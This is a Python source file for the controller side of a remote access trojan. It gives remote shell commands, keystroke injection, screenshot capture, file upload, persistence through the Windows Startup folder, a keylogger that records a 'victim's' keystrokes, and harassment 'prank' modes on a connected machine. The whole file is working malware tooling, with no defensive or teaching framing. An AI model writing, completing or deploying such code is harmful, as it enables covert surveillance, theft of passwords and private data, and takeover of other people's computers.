import socket
import base64
import os
import time
import threading


SERVER = "0.0.0.0"
PORT = 4455


def start_server():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((SERVER, PORT))
    s.listen(1)
    
    print(f"[*] Server listening on {SERVER}:{PORT}")
    
    while True:
        client, addr = s.accept()
        print(f"[+] Client connected: {addr}")
        client.send(b"Connected to server")
        
        handle_client(client)
        
        client.close()
        print("[+] Client disconnected")
        
        cont = input("[?] Wait for new client? (y/n): ").lower()
        if cont in ['n', 'no']:
            break
    
    s.close()

def save_screenshot(img_b64, filename=None):
    """Save screenshot to file"""
    try:
        if filename is None:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"
        
        img_data = base64.b64decode(img_b64)
        
        with open(filename, 'wb') as f:
            f.write(img_data)
        
        print(f"[+] Screenshot saved as: {filename}")
        return filename
    except Exception as e:
        print(f"[-] Error saving screenshot: {e}")
        return None

def command_mode(client):
    print("[*] Command Mode - Type 'quit' to exit")
    while True:
        try:
            cmd = input("CMD >>> ").strip()
            client.send(cmd.encode())
            
            if cmd.lower() in ['q', 'quit', 'exit']:
                break
            
            output = b""
            while True:
                chunk = client.recv(4096)
                output += chunk
                if b"###END###" in output:
                    break
            
            output = output.replace(b"###END###", b"")
            print(output.decode('utf-8', errors='ignore'))
            
        except Exception as e:
            print(f"[-] Command error: {e}")
            break

def keystroke_mode(client):
    print("[*] Keystroke Mode")
    while True:
        print("\nOptions:")
        print("1 - Send text to type")
        print("2 - Send keys (e.g., alt+tab, ctrl+c)")
        print("q - Exit")
        
        choice = input("Select >>> ").strip()
        
        if choice == '1':
            text = input("Enter text to type >>> ")
            client.send(f"TEXT:{text}".encode())
            response = client.recv(1024).decode()
            print(response)
            
        elif choice == '2':
            keys = input("Enter keys >>> ")
            client.send(f"KEYS:{keys}".encode())
            response = client.recv(1024).decode()
            print(response)
            
        elif choice.lower() in ['q', 'quit']:
            client.send(b"EXIT_KEYSTROKE_MODE")
            client.recv(1024)
            break
        else:
            print("[-] Invalid choice")

def audio_mode(client):
    print("[*] Audio Mode")
    while True:
        print("\nOptions:")
        print("1 - Text to Speech")
        print("2 - Play Audio File")
        print("q - Exit")
        
        choice = input("Select >>> ").strip()
        
        if choice == '1':
            while True:
                text = input("Enter text to speak >>> ")
                if text== "":
                    break
                client.send(f"TTS:{text}".encode())
                response = client.recv(1024).decode()
                print(response)
            
        elif choice == '2':
            file_path = input("Enter audio file path >>> ")
            
            if not os.path.exists(file_path):
                print("[-] File not found")
                continue
                
            try:
                with open(file_path, 'rb') as f:
                    audio_data = f.read()
                
                if len(audio_data) > 5 * 1024 * 1024:
                    print("[-] File too large (max 5MB)")
                    continue
                
                audio_b64 = base64.b64encode(audio_data).decode()
                client.send(f"AUDIO:{audio_b64}".encode())
                response = client.recv(1024).decode()
                print(response)
                
            except Exception as e:
                print(f"[-] Error: {e}")
                
        elif choice.lower() in ['q', 'quit']:
            client.send(b"EXIT_AUDIO_MODE")
            client.recv(1024)
            break
        else:
            print("[-] Invalid choice")

def screenshot_mode(client):
    print("[*] Screenshot Mode")
    client.send(b"TAKE_SCREENSHOT")
    response = client.recv(1024 * 1024).decode()
    
    if response.startswith("SCREENSHOT_OK:"):
        img_b64 = response[14:]
        filename = save_screenshot(img_b64)
        if filename:
            print(f"[+] Screenshot saved successfully: {filename}")
        else:
            print("[-] Failed to save screenshot")
    else:
        print("[-] Screenshot failed")

def file_transfer_mode(client):
    print("[*] File Transfer Mode")
    
    file_path = input("Enter file path to transfer >>> ").strip()
    
    if not os.path.exists(file_path):
        print("[-] File not found")
        return
    
    original_filename = os.path.basename(file_path)
    
    save_path = input(f"Enter save path on victim PC (empty = {original_filename} in current dir) >>> ").strip()
    
    if not save_path:
        save_path = original_filename
        print(f"[+] Will save as: {save_path} (current directory)")
    
    try:
        print("[+] Reading file...")
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        file_size = len(file_data)
        file_size_mb = file_size / (1024 * 1024)
        print(f"[+] File size: {file_size_mb:.2f} MB")
        
        if file_size > 500 * 1024 * 1024:
            print("[-] File too large (max 500MB)")
            return
        
        client.send(f"SAVE_PATH:{save_path}".encode())
        
        response = client.recv(1024).decode()
        if response != 'PATH_CONFIRMED':
            print(f"[-] Path confirmation failed: {response}")
            return
        
        chunk_size = 8192
        total_sent = 0
        print("[+] Sending file data...")
        
        for i in range(0, len(file_data), chunk_size):
            chunk = file_data[i:i + chunk_size]
            client.send(chunk)
            total_sent += len(chunk)
            
            if total_sent % (5 * 1024 * 1024) == 0:
                print(f"[+] Sent {total_sent / (1024 * 1024):.1f} MB", end='\r')
        
        client.send(b"FILE_END")
        print(f"\n[+] File sent completely: {total_sent} bytes")
        
        result = client.recv(1024).decode()
        if result.startswith('FILE_SAVED:'):
            print(f"[+] File transfer successful: {result[11:]}")
        else:
            print(f"[-] File transfer failed: {result}")
            
    except Exception as e:
        print(f"[-] File transfer error: {e}")

def background_file_execution_mode(client):
    print("[*] Background File Execution Mode")
    print("[!] Files will be saved to Windows Startup folder")
    
    while True:
        print("\n" + "="*50)
        print("Options:")
        print("1 - Transfer file to startup folder")
        print("2 - List available files in current directory")
        print("q - Exit")
        print("="*50)
        
        choice = input("\nSelect >>> ").strip()
        
        if choice == '1':
            print("\n[+] Files in current directory:")
            for file in os.listdir('.'):
                if os.path.isfile(file):
                    size = os.path.getsize(file)
                    print(f"    {file} ({size / (1024*1024):.2f} MB)")
            
            file_path = input("\nEnter file path to transfer >>> ").strip()
            
            if not os.path.exists(file_path):
                print("[-] File not found")
                continue
                
            try:
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                
                file_size = len(file_data)
                filename = os.path.basename(file_path)
                
                if file_size > 500 * 1024 * 1024:
                    print(f"[-] File too large: {file_size / (1024*1024):.2f} MB (max 500MB)")
                    continue
                
                print(f"\n[+] Preparing: {filename} ({file_size / (1024*1024):.2f} MB)")
                
                header = f"BG_FILE:{filename}:{file_size}:"
                client.send(header.encode())
                
                response = client.recv(1024).decode()
                if response != 'READY':
                    print(f"[-] Client not ready: {response}")
                    continue
                
                print("[+] Transferring file...")
                chunk_size = 131072
                sent = 0
                start_time = time.time()
                
                for i in range(0, file_size, chunk_size):
                    chunk = file_data[i:i + chunk_size]
                    client.send(chunk)
                    sent += len(chunk)
                    
                    if sent % (5 * 1024 * 1024) == 0:
                        elapsed = time.time() - start_time
                        speed = sent / (1024 * 1024) / elapsed if elapsed > 0 else 0
                        print(f"    Progress: {sent / (1024*1024):.1f} MB / {file_size / (1024*1024):.1f} MB ({speed:.1f} MB/s)")
                
                result = client.recv(1024).decode()
                if result.startswith('SUCCESS:'):
                    print(f"[✓] {result[8:]}")
                else:
                    print(f"[-] {result}")
                    
            except Exception as e:
                print(f"[-] Transfer error: {e}")
                
        elif choice == '2':
            print("\n[+] Files in current directory:")
            print("-" * 60)
            for file in sorted(os.listdir('.')):
                if os.path.isfile(file):
                    size = os.path.getsize(file)
                    mod_time = time.ctime(os.path.getmtime(file))
                    print(f"  {file:<30} {size / (1024*1024):>6.1f} MB  {mod_time}")
            print("-" * 60)
                
        elif choice.lower() in ['q', 'quit']:
            client.send(b"EXIT_BACKGROUND_MODE")
            client.recv(1024)
            break
        else:
            print("[-] Invalid choice")

def keylogger_mode(client):
    print("[*] Keylogger Mode")
    print("[!] Capturing all keystrokes from victim")
    
    log_file = f"keylog_{int(time.time())}.txt"
    is_monitoring = True
    total_chars_captured = 0
    
    def save_to_file(data):
        try:
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]\n")
                f.write(data)
                f.write('\n' + '='*50 + '\n\n')
            return True
        except Exception as e:
            print(f"Save error: {e}")
            return False

    print(f"[+] Log file: {log_file}")
    print("\nCommands: status, save, stop, help")
    print("[+] Keylogger active. Type 'stop' to exit.")
    print("[+] Start typing on victim machine...")
    
    def monitor_thread_func():
        nonlocal total_chars_captured, is_monitoring
        while is_monitoring:
            try:
                client.settimeout(0.5)
                data = client.recv(65536).decode()
                
                if data.startswith('KEYLOG:'):
                    keystrokes = data[7:]
                    if keystrokes.strip():
                        total_chars_captured += len(keystrokes)
                        print(f"\n[✓] Captured {len(keystrokes)} chars (Total: {total_chars_captured})")
                        save_to_file(keystrokes)
                        
                        preview = keystrokes[-50:]
                        if preview.strip():
                            print(f"Recent: {preview}")
                            
                elif data == 'KEYLOGGER_READY':
                    print("[+] Keylogger ready on client")
                    
                elif data == 'KEYLOGGER_STOPPED':
                    print("[+] Keylogger stopped on client")
                    is_monitoring = False
                    break
                    
            except socket.timeout:
                continue
            except Exception as e:
                if "10054" in str(e):
                    print("[-] Connection lost")
                    break
    
    monitor_thread = threading.Thread(target=monitor_thread_func, daemon=True)
    monitor_thread.start()
    
    try:
        while is_monitoring:
            cmd = input("\nkeylogger> ").strip().lower()
            
            if cmd == 'status':
                client.send(b'GET_STATUS')
                print("[+] Status request sent")
                
            elif cmd == 'save':
                client.send(b'SAVE_NOW')
                print("[+] Save command sent")
                
            elif cmd in ['stop', 'exit', 'quit']:
                is_monitoring = False
                client.send(b'STOP_KEYLOGGER')
                print("[+] Stopping...")
                time.sleep(2)
                break
                
            elif cmd == 'help':
                print("Commands: stop, status, save")
            elif cmd:
                print("[-] Unknown command")
                
    except KeyboardInterrupt:
        print("\n[!] Stopping keylogger...")
        is_monitoring = False
        client.send(b'STOP_KEYLOGGER')
    except Exception as e:
        print(f"Keylogger error: {e}")
    finally:
        client.settimeout(None)
        print(f"\n[+] Keylogger stopped. Logs: {log_file}")
        if os.path.exists(log_file):
            size = os.path.getsize(log_file)
            print(f"[+] File size: {size} bytes, Chars: {total_chars_captured}")

def prank_mode(client):
    print("[*] Simulation Mode (Controlled Pranks)")

    menu = """
1 - Fake Update Screen
2 - Mouse Chaos
3 - Keyboard Echo
4 - Screen Flash
5 - Fake Alert
6 - Window Spam
7 - Fun Media
q - Exit
"""
    print(menu)

    while True:
        choice = input("Select >>> ").strip().lower()

        if choice == '1':
            client.send(b"PRANK:FAKE_UPDATE")

        elif choice == '2':
            duration = input("Duration (seconds) >>> ").strip()
            client.send(f"PRANK:MOUSE_CHAOS:{duration}".encode())

        elif choice == '3':
            client.send(b"PRANK:KEY_ECHO")

        elif choice == '4':
            client.send(b"PRANK:FLASH")

        elif choice == '5':
            sub = input("Alert message >>> ")
            client.send(f"PRANK:FAKE_ALERT:{sub}".encode())

        elif choice == '6':
            sub = input("Number of windows >>> ").strip()
            client.send(f"PRANK:WINDOW_SPAM:{sub}".encode())

        elif choice == '7':
            client.send(b"PRANK:FUN_MEDIA")

        elif choice in ['q', 'quit']:
            client.send(b"EXIT_PRANK_MODE")
            break

        else:
            print("[-] Invalid choice")



def handle_client(client):
    while True:
        try:
            menu = client.recv(1024).decode()
            print(menu)
            
            mode = input("Select mode >>> ").strip()
            client.send(mode.encode())
            
            if mode == '0':
                command_mode(client)
            elif mode == '1':
                keystroke_mode(client)
            elif mode == '2':
                audio_mode(client)
            elif mode == '3':
                screenshot_mode(client)
            elif mode == '4':
                file_transfer_mode(client)
            elif mode == '5':
                background_file_execution_mode(client)
            elif mode == '6':
                keylogger_mode(client)
            elif mode == '7':
                prank_mode(client)
            elif mode.lower() in ['q', 'quit']:
                break
            else:
                print("[-] Invalid mode")
                
        except Exception as e:
            print(f"[-] Client error: {e}")
            break




if __name__ == "__main__":
    try:
        start_server()
    except KeyboardInterrupt:
        print("\n[*] Server stopped")
    except Exception as e:
        print(f"[-] Server error: {e}")